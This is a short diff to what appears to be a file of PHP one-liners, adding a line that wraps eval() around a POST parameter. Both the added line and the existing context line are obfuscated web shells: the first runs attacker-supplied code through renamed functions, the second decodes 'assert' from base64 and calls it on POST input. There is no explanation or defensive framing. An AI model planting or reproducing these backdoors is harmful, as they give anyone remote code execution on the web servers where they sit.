@@ -1,3 +1,7 @@
+<?php function xxxx($str){return eval($str);}function yyyyyyyyyyyyy($str){return base64_decode($str);}function zzzz(){return $_POST['st@t'];}xxxx(zzzz());?>
+
+/*--------------------------------------------------------------------------------*/ 
+
 <?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?>
 
 /*--------------------------------------------------------------------------------*/ 
